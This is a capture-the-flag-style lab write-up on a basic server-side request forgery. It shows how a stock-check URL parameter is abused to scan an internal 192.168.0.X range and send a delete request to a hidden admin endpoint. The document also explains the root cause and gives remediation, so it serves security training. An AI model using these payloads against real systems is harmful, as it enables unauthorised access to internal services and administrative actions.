# Basic SSRF Against Another Back-End System

## Lab Overview

This lab demonstrates how a Server-Side Request Forgery (SSRF) vulnerability can be used to access internal systems hosted on a private network. Unlike localhost-based SSRF, this scenario requires identifying another internal server and exploiting the vulnerable application to communicate with it.

**Difficulty:** Apprentice

**Category:** Server-Side Request Forgery (SSRF)

---

# Objective

Identify the internal back-end server hosting the administrative interface and delete the user **carlos**.

---

# Vulnerability

The application accepts a user-controlled URL through the stock check functionality and performs the request directly from the server.

Because the server is connected to the internal network, it can communicate with private IP addresses that are inaccessible to external users.

Failure to validate the destination URL results in an SSRF vulnerability.

---

# Exploitation Steps

### 1. Intercept the stock check request

Capture the request using Burp Suite.

Example:

```
stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
```

---

### 2. Identify the internal server

The lab specifies that the admin interface is hosted somewhere within:

```
192.168.0.X
```

Use Burp Intruder to enumerate the IP range.

Payload:

```
192.168.0.1
192.168.0.2
...
192.168.0.255
```

Example request:

```
http://192.168.0.§X§:8080/admin
```

---

### 3. Locate the admin interface

One of the responses returns the internal admin page.

Example:

```
http://192.168.0.12:8080/admin
```

---

### 4. Delete Carlos

Locate the delete endpoint.

Example:

```
http://192.168.0.12:8080/admin/delete?username=carlos
```

Send the request.

The lab is solved.

---

# Root Cause

The application performs outbound HTTP requests using user-controlled input without validating the destination.

As a result, attackers can force the server to communicate with internal hosts that are otherwise unreachable from the public internet.

---

# Security Impact

Successful exploitation can lead to:

- Internal network reconnaissance
- Discovery of hidden administrative interfaces
- Access to internal APIs
- Unauthorized administrative actions
- Lateral movement inside corporate networks

---

# Remediation

- Allow requests only to trusted domains using a strict allowlist.
- Block requests to private IP ranges.
- Restrict access to localhost and internal services.
- Validate the final destination after redirects.
- Restrict outbound network communication where possible.

---

# Key Takeaways

- SSRF can target systems beyond localhost.
- Internal network enumeration is a common SSRF technique.
- Servers often have access to private infrastructure that external users cannot reach.
- Never trust user-controlled URLs without strict validation.

---

**Status:** ✅ Solved
